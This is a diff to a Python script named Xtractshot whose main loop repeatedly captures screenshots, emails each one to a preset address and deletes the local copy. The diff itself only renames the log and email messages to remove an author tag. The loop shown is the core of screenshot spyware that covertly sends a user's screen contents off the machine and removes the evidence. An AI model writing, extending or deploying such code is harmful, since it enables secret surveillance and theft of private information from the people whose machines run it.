@@ -102,22 +102,22 @@ def delete_local_files(file_path):
         print(f"Failed to delete file {file_path}: {e}")
 
 def main():
-    logging.info("Xtractshot by X3NIDE started")
-    send_email("Xtractshot by X3NIDE", "The Xtractshot has started.", None, toaddr)
+    logging.info("Xtractshot has started")
+    send_email("Xtractshot", "Xtractshot has started.", None, toaddr)
     try:
         while True:
             screenshot_filename = screenshot()
             if screenshot_filename:
-                send_email("New Xtractshot Available by X3NIDE", "", screenshot_filename, toaddr)
+                send_email("New Screenshot Available", "", screenshot_filename, toaddr)
                 delete_local_files(screenshot_filename)
             time.sleep(interval)
     except KeyboardInterrupt:
-        logging.info("Xtractshot by X3NIDE stopped by user")
-        send_email("Xtractshot by X3NIDE Stopped", "The Xtractshot has stopped.", None, toaddr)
+        logging.info("Xtractshot has stopped by user")
+        send_email("Xtractshot Stopped", "Xtractshot has stopped.", None, toaddr)
     except Exception as e:
-        logging.error(f"An error occurred in Xtractshot by X3NIDE: {e}")
-        send_email("Xtractshot by X3NIDE Error", f"An error occurred: {e}", None, toaddr)
-        print(f"An error occurred in Xtractshot by X3NIDE: {e}", file=sys.stderr)
+        logging.error(f"An error occurred in Xtractshot: {e}")
+        send_email("Xtractshot Error", f"An error occurred: {e}", None, toaddr)
+        print(f"An error occurred in Xtractshot: {e}", file=sys.stderr)
 
 if __name__ == "__main__":
     main()
